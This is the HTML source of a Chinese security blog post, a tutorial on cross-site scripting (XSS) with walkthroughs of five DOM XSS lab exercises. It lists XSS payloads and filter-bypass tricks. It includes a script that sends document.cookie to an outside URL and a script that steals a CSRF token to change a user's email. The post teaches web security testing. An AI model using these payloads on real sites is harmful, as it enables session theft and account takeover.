@@ -1,0 +1,741 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="en">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="XSS原理及DOMXSS实战">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XSS+DOM_XSS实战">
+<meta property="og:url" content="http://yoursite.com/2020/03/22/XSS%E5%8E%9F%E7%90%86+DOMXSS%E5%AE%9E%E6%88%98/index.html">
+<meta property="og:site_name" content="Xingg&#39;s Blog">
+<meta property="og:description" content="XSS原理及DOMXSS实战">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200322195131362.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjEyODYxNA==,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200322195149796.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200322195456703.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200322195517210.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/2020032219573377.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200322195751979.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200322195804752.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjEyODYxNA==,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200322200005854.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200322200027496.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200322200056384.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200322200108918.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200322200200468.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/2020032220022057.png">
+<meta property="article:published_time" content="2020-03-22T12:47:29.000Z">
+<meta property="article:modified_time" content="2020-03-22T12:35:00.627Z">
+<meta property="article:author" content="Xingg">
+<meta property="article:tag" content="vulnhub">
+<meta property="article:tag" content="HTB">
+<meta property="article:tag" content="kali">
+<meta property="article:tag" content="web安全">
+<meta property="article:tag" content="渗透测试">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://img-blog.csdnimg.cn/20200322195131362.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjEyODYxNA==,size_16,color_FFFFFF,t_70">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2020/03/22/XSS原理+DOMXSS实战/"/>
+
+
+
+
+
+  <title>XSS+DOM_XSS实战 | Xingg's Blog</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Xingg's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/22/XSS%E5%8E%9F%E7%90%86+DOMXSS%E5%AE%9E%E6%88%98/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Xingg">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Xingg's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">XSS+DOM_XSS实战</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-03-22T20:47:29+08:00">
+                2020-03-22
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index">
+                    <span itemprop="name">web安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>XSS原理及DOMXSS实战</p>
+<a id="more"></a>
+
+<h1 id="1-XSS成因"><a href="#1-XSS成因" class="headerlink" title="1. XSS成因"></a>1. XSS成因</h1><p>用户在客户端输入一个内容，服务端收到这个内容，并把它嵌入网页再返回给用户，这是一个常见的功能。如果用户输入的这个内容是一段精心构造的js代码，服务端恰好没有过滤，那返回的js就会被浏览器执行。</p>
+<h1 id="2-XSS分类"><a href="#2-XSS分类" class="headerlink" title="2. XSS分类"></a>2. XSS分类</h1><p>2.1 反射型<br>常见把js构造在URL中，然后引导其他人点击这个恶意URL，造成反射型XSS<br>2.2 存储型<br>把恶意的js发送到服务端并存储，以后其他用户每次浏览页面，都会触发XSS<br>2.3 DOM型<br>DOM型XSS是特殊的XSS，页面中有很多元素，浏览器会为这些元素创建对应的文档对象，每个对象都有属性和方法。通过构造js编辑文档对象，修改页面，获取DOM中的数据</p>
+<h1 id="3-XSSpayload"><a href="#3-XSSpayload" class="headerlink" title="3. XSSpayload"></a>3. XSSpayload</h1><p>3.1 常用payload<br><code>&lt;script&gt;alert(/xss/);&lt;/script&gt;</code><br><code>&lt;BODY ONLOAD=alert(&#39;XSS&#39;)&gt;</code><br><code>&lt;img src=x onerror=alert(1)&gt;</code><br><code>&lt;svg onload=alert(1)&gt;</code><br><code>&lt;a href = javasript:alert(1)&gt;</code><br>3.2 常用凑js思路<br>a. <code>&lt;/script&gt;</code>闭合前一个js<br>b. 跳出前一个js<br><code>&#39;-alert(document.domain)-&#39;</code><br><code>&#39;;alert(document.domain)//</code><br>c. 绕过转译字符<br><code>&#39;;alert(document.domain)// 会被转译为 \&#39;;alert(document.domain)//</code><br>所以我们输入<br><code>\&#39;;alert(document.domain)//会被转译为\\&#39;;alert(document.domain)//</code><br>js又可以成功执行了<br>d. 用HTML解析绕过单引号<br><code>&amp;apos;</code> 代表单引号<br><code>&amp;apos;-alert(1)-&amp;apos;</code> 等于<code>&#39;-alert(document.domain)-&#39;</code><br>e. 嵌入模板跳出双引号<br><code>${alert(1)}</code> 是一个嵌入的模板<br>前后闭合双引号<br><code>&quot;${alert(1)}&quot;</code><br>3.3 偷cookie的js</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> &lt;script&gt;</span><br><span class="line">fetch(&#39;https:&#x2F;&#x2F; &#39;, &#123;</span><br><span class="line">method: &#39;POST&#39;,</span><br><span class="line">mode: &#39;no-cors&#39;,</span><br><span class="line">body:document.cookie</span><br><span class="line">&#125;);</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
+<p>3.4 配合csrf偷tokens<br><img src="https://img-blog.csdnimg.cn/20200322195131362.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjEyODYxNA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200322195149796.png" alt="在这里插入图片描述"></p>
+<p>这样一个修改邮箱的地址框，背后带有token防止csrf<br>但是配合XSS 就可以偷取token，修改邮箱</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">	var req &#x3D; new XMLHttpRequest(); </span><br><span class="line">	req.onload &#x3D; handleResponse; </span><br><span class="line">	req.open(&#39;get&#39;,&#39;&#x2F;email&#39;,true); </span><br><span class="line">	req.send();</span><br><span class="line">	function handleResponse() &#123;</span><br><span class="line">	    var token &#x3D; this.responseText.match(&#x2F;name&#x3D;&quot;csrf&quot; value&#x3D;&quot;(\w+)&quot;&#x2F;)[1];</span><br><span class="line">	    var changeReq &#x3D; new XMLHttpRequest(); </span><br><span class="line">	    changeReq.open(&#39;post&#39;, &#39;&#x2F;email&#x2F;change&#39;, true);</span><br><span class="line">	    changeReq.send(&#39;csrf&#x3D;&#39;+token+&#39;&amp;email&#x3D;test@test.com&#39;)</span><br><span class="line">	&#125;;</span><br><span class="line">	&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
+<p>发送一个请求 去到email页面 偷取token<br>发送第二个请求 携带token，修改邮箱<br>3.5 查找反射XSS小技巧<br>用Repeater模块发送payload，然后在回复里查找这个payload，如果解析了，则存在XSS</p>
+<h1 id="4-可能导致DOMXSS的函数"><a href="#4-可能导致DOMXSS的函数" class="headerlink" title="4. 可能导致DOMXSS的函数"></a>4. 可能导致DOMXSS的函数</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">document.write()</span><br><span class="line">document.writeln()</span><br><span class="line">document.domain</span><br><span class="line">someDOMElement.innerHTML</span><br><span class="line">someDOMElement.outerHTML</span><br><span class="line">someDOMElement.insertAdjacentHTML</span><br><span class="line">someDOMElement.onevent</span><br><span class="line">jQuery functions：</span><br><span class="line">add()</span><br><span class="line">after()</span><br><span class="line">append()</span><br><span class="line">animate()</span><br><span class="line">insertAfter()</span><br><span class="line">insertBefore()</span><br><span class="line">before()</span><br><span class="line">html()</span><br><span class="line">prepend()</span><br><span class="line">replaceAll()</span><br><span class="line">replaceWith()</span><br><span class="line">wrap()</span><br><span class="line">wrapInner()</span><br><span class="line">wrapAll()</span><br><span class="line">has()</span><br><span class="line">constructor()</span><br><span class="line">init()</span><br><span class="line">index()</span><br><span class="line">jQuery.parseHTML()</span><br><span class="line">$.parseHTML()</span><br></pre></td></tr></table></figure>
+<h1 id="5-实战DOMXSS"><a href="#5-实战DOMXSS" class="headerlink" title="5. 实战DOMXSS"></a>5. 实战DOMXSS</h1><h2 id="a-实战1"><a href="#a-实战1" class="headerlink" title="a. 实战1"></a>a. 实战1</h2><p><img src="https://img-blog.csdnimg.cn/20200322195456703.png" alt="在这里插入图片描述"><br>输入随机字符，然后做检查<br><img src="https://img-blog.csdnimg.cn/20200322195517210.png" alt="在这里插入图片描述"><br>发现了qqq在img内<br>我们拼接<br><code>“&gt;&lt;svg onload=alert(1)&gt;</code><br>成功触发</p>
+<h2 id="b-实战2"><a href="#b-实战2" class="headerlink" title="b. 实战2"></a>b. 实战2</h2><p><img src="https://img-blog.csdnimg.cn/2020032219573377.png" alt="在这里插入图片描述"><br>有一个选择查询框<br>点击查询，bp截包查看<br>        <img src="https://img-blog.csdnimg.cn/20200322195751979.png" alt="在这里插入图片描述"><br>        发现post包里有两个参数<br>        右击查看元素<br>        <img src="https://img-blog.csdnimg.cn/20200322195804752.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjEyODYxNA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>        发现js会用get方法读取storeId，然后document.write写进页面里，拼接他的内容<br>        <code>&quot;&gt;&lt;/select&gt;&lt;img%20src=1%20onerror=alert(10)&gt;</code><br>        就能构成<br>        <code>&lt;select name=&quot;&quot;&gt;&lt;/select&gt;&lt;img%20src=1%20onerror=alert(10)&gt;</code><br>        完成XSS</p>
+<h2 id="c-实战3"><a href="#c-实战3" class="headerlink" title="c. 实战3"></a>c. 实战3</h2><p><img src="https://img-blog.csdnimg.cn/20200322200005854.png" alt="在这里插入图片描述"><br>先搜索qqqq<br><img src="https://img-blog.csdnimg.cn/20200322200027496.png" alt="在这里插入图片描述"><br>发现搜索内容直接嵌入到了HTML标签里<br>可以直接嵌入img 然后调用onerror=alert()触发<br><img src="https://img-blog.csdnimg.cn/20200322200056384.png" alt=""><br><img src="https://img-blog.csdnimg.cn/20200322200108918.png" alt=""></p>
+<h2 id="d-实战4"><a href="#d-实战4" class="headerlink" title="d. 实战4"></a>d. 实战4</h2><p>发现url中含有参数<br><img src="https://img-blog.csdnimg.cn/20200322200200468.png" alt="在这里插入图片描述"><br>在其中一个Back标签，跳转的href参数是从用户端的URL传进来的<br><img src="https://img-blog.csdnimg.cn/2020032220022057.png" alt="在这里插入图片描述"><br>构造url<br><code>https://ac121f241fb558428099334d007e003d.web-security-academy.net/feedback?returnPath=javascript:alert(1)</code><br>然后点击Back，完成了XSS</p>
+<h2 id="e-实战5"><a href="#e-实战5" class="headerlink" title="e. 实战5"></a>e. 实战5</h2><p>AngularJS 在检查元素中发现了ng-app 确认js library<br>然后在输入框 直接两个花括号执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;\$on.constructor(&#39;alert(1)&#39;)()&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>这段payload没有这个反斜杠\，但是去掉的话，会被我的服务器当HTML解析了，过于真实，X到自己了</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/03/22/windows_sethc%E6%BC%8F%E6%B4%9E_5%E6%AC%A1shift%E8%8E%B7%E5%8F%96%E7%B3%BB%E7%BB%9F%E6%9D%83%E9%99%90/" rel="next" title="windows_sethc漏洞_5次shift获取系统权限">
+                <i class="fa fa-chevron-left"></i> windows_sethc漏洞_5次shift获取系统权限
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">Xingg</p>
+              <p class="site-description motion-element" itemprop="description">记录一个网安民工日常迷惑操作 xingg051@163.com</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">19</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">12</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#1-XSS成因"><span class="nav-text">1. XSS成因</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2-XSS分类"><span class="nav-text">2. XSS分类</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#3-XSSpayload"><span class="nav-text">3. XSSpayload</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#4-可能导致DOMXSS的函数"><span class="nav-text">4. 可能导致DOMXSS的函数</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#5-实战DOMXSS"><span class="nav-text">5. 实战DOMXSS</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#a-实战1"><span class="nav-text">a. 实战1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#b-实战2"><span class="nav-text">b. 实战2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#c-实战3"><span class="nav-text">c. 实战3</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#d-实战4"><span class="nav-text">d. 实战4</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#e-实战5"><span class="nav-text">e. 实战5</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Xingg</span>
+
+  
+</div>
+<!--
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
+
+-->
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
